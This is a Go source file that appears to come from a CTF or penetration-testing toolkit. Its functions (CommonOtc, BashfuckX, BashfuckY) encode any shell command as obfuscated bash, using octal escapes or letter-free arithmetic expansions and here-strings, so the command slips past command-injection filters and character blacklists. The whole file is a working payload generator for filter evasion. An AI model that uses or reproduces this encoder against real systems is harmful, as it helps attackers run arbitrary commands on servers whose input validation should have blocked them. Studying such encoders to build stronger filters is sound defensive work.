package script

import (
	"fmt"
	"strings"
)

func info(s string) string {
	total := 0
	usedChars := make(map[rune]bool)
	for _, c := range s {
		if c >= 32 && c <= 126 && !usedChars[c] {
			total++
			usedChars[c] = true
		}
	}
	var sb strings.Builder

	sb.WriteString(fmt.Sprintf("%s", s))
	return sb.String()
}

func getOct(c rune) string {
	return fmt.Sprintf("%o", c)
}

func CommonOtc(cmd string) string {
	var payload strings.Builder
	payload.WriteString("$'")
	for _, c := range cmd {
		if c == ' ' {
			payload.WriteString("' $'")
		} else {
			payload.WriteString(fmt.Sprintf("\\%s", getOct(c)))
		}
	}
	payload.WriteString("'")
	return info(payload.String())
}

func BashfuckX(cmd string, form string) string {
	var bashStr strings.Builder
	for _, c := range cmd {
		bashStr.WriteString(fmt.Sprintf("\\\\$(($((1<<1))#%b))", c))
	}
	payloadBit := bashStr.String()
	payloadZero := strings.ReplaceAll(payloadBit, "1", "${##}")
	payloadC := strings.ReplaceAll(payloadZero, "0", "${#}")
	switch form {
	case "bit":
		payloadBit = fmt.Sprintf("$0<<<$0\\\\<\\\\<\\\\<\\$\\'%s\\'", payloadBit)
		return info(payloadBit)
	case "zero":
		payloadZero = fmt.Sprintf("$0<<<$0\\\\<\\\\<\\\\<\\$\\'%s\\'", payloadZero)
		return info(payloadZero)
	case "c":
		payloadC = fmt.Sprintf("${!#}<<<${!#}\\\\<\\\\<\\\\<\\$\\'%s\\'", payloadC)
		return info(payloadC)
	default:
		return ""
	}
}

func BashfuckY(cmd string) string {
	octList := []string{
		"$(())",
		"$((~$(($((~$(())))$((~$(())))))))",
		"$((~$(($((~$(())))$((~$(())))$((~$(())))))))",
		"$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",
		"$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",
		"$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",
		"$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",
		"$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",
	}
	var bashFuck strings.Builder
	bashFuck.WriteString("__=$(())")
	bashFuck.WriteString("&&")
	bashFuck.WriteString("${!__}<<<${!__}\\\\<\\\\<\\\\<\\$\\'")
	for _, c := range cmd {
		bashFuck.WriteString("\\\\")
		for _, i := range getOct(c) {
			index := i - '0'
			bashFuck.WriteString(octList[index])
		}
	}
	bashFuck.WriteString("\\'")
	return info(bashFuck.String())
}
